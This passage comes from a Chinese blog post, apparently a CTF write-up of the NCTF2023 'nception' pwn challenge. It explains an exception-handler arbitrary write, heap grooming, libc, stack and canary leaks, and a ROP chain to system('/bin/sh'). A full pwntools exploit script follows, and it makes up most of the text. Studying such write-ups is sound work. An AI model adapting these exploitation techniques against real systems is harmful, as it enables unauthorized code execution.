    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>另一种解法，可见星盟安全团队的wp：https://blog.xmcve.com/2023/12/28/NCTF2023-Writeup/#title-13</p>
<p>在main函数的catch 中会先执行<code>___cxa_begin_catch</code>，该函数会指向对象的指针</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111780.png' alt="image-20240104212532070"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111781.png' alt="image-20240104213002056"></p>
<p>该对象的前8字节指向libc c++ 中的vtable ，后8字节指向存储字符串的堆地址。</p>
<p>接下来会将rax赋值给rbp-0x18 的地址。</p>
<p>我们可以在edit 控制rbp，然后通过错误处理执行到这里，那么 利用该条语句可以实现任意地址写。</p>
<p>注意到程序中的结构如下<code>ptr-&gt;heap-&gt;content</code></p>
<p>我们可以通过任意地址写将rax 写到 heap 中指向content的指针，那么通过show 就可以泄露libc地址。</p>
<blockquote>
<p>此时泄露完libc之后，可以像上面的解法一样，进行栈迁移后即可控制执行流程，且有了libc地址，可以直接利用pop rdi 这样的gadget了</p></blockquote>
<p>另一方面，我们可以利用这个任意地址写将程序中的数据结构指针末位置0，实现错位构造，从而实现任意读写。</p>
<p>可以看到如果我们将ptr中存储的heap 指针末尾置0，并在其置0的位置布置好content指针，就可以实现任意地址读。</p>
<blockquote>
<p>也可以将heap 存储的content指针末尾置0，通过edit content 就可以控制相应heap 中的content 指针和size，如heap2 heap3 heap4 heap5 heap6等，实现任意读写。</p></blockquote>
<p>这里选择将<code>0x13ca0e0</code>置0，即<code>0x13ca000</code>,这个地址正好是heap0 的content指针偏移0x130处。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111782.png' alt="image-20240104214237746"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111783.png' alt="image-20240104214627963"></p>
<p>因此我们需要事先在heap0 的content指针偏移0x130布置好要读取的地址，然后利用异常处理中的任意地址写将prt+8处存储的heap 指针末位置0。</p>
<blockquote>
<p>需要注意，如果直接利用异常处理中的任意地址写将prt+8处存储的heap1指针末位置0，它也会影响ptr 中存储的heap0指针。因此我们需要稍微设置一下堆布局，add7次之后，将heap1-到heap6释放，接着再把他们申请回来，由于tcache中的FILO机制，会使ptrs+8-&gt;ptrs+48 中的heap 指针逆序</p></blockquote>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111784.png' alt="image-20240104215334455"></p>
<p>这样错位写ptrs+48 中的末尾地址仅仅会影响ptrs+40，不会影响heap0指针。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111785.png' alt="image-20240104221426505"></p>
<p>接下来就是先在heap0 的content指针偏移0x130处布置好got表，0x138 布置好长度，然后show(6)泄露libc</p>
<p>同样的方法利用environ泄露stack_addr ，并泄露canary，然后利用edit 的溢出构造好rop链即可getshell。</p>
<p>需要注意的使environ的地址末位为<code>&quot;\x20&quot;</code>,无法通过cin读入，那么我们就需要设置任意地址读environ+1，</p>
<p>泄露stack 的高5位字节，然后爆破canary 的位置，最后泄露出canary （泄露出的canary 不一定正确，需要多次运行），最后就是溢出写rop getshell。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ae64</span> <span class="kn">import</span> <span class="n">AE64</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=remote(&#34;8.130.35.16&#34;,58000)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&#34;./nception&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s2">&#34;b *0x00402781</span><span class="se">\n</span><span class="s2">b *0x0402E49</span><span class="se">\n</span><span class="s2"> b*0x0402E24&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">choice</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Now input your choice: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;To write object, input idx:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Now data offset:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Now input your data:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">s</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Which one do you want to read?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Which one do you want to destroy?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x130</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x405FC8</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x130</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x444</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">544</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x406429</span><span class="o">+</span><span class="mh">0x18</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">uu64</span><span class="p">()</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;close&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">environ</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_environ&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x130</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x130</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x444</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_base</span><span class="o">=</span><span class="n">uu64</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;stack_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">canary_addr</span><span class="o">=</span><span class="n">stack_base</span><span class="o">-</span><span class="mh">0x78</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;canary_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">=-</span><span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x130</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary_addr</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x130</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x444</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">show</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Data: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="o">=</span><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="o">==</span><span class="mi">8</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="n">canary</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">result</span><span class="p">[:</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;canary&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x0000000000027765</span><span class="o">+</span><span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span><span class="o">=</span><span class="mh">0x00000000000270e2</span> <span class="o">+</span><span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x208</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 class="heading-element" id="待做"><span>待做</span>
  <a href="#%e5%be%85%e5%81%9a" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><strong>Spirit战队</strong>wp中采用了反弹shell 的做法，这里我还不太了解，后续再学习吧。https://mp.weixin.qq.com/s/PtM7i5bPU2I7h3wZ328JQQ</p></div><div class="collection-card">
      <div class="collection-title text-secondary">收录于 <a href="/collections/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-layer-group fa-fw" aria-hidden="true"></i> <span>合集・赛题复现</span></span></a> 1</div>
      <div class="collection-nav">
        </div>
    </div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2025-01-04 23:47:07">更新于 2025-01-04&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="https://chuw3i.github.io/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/" data-title="2023 12月比赛wp复现" data-hashtags="赛题复现"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
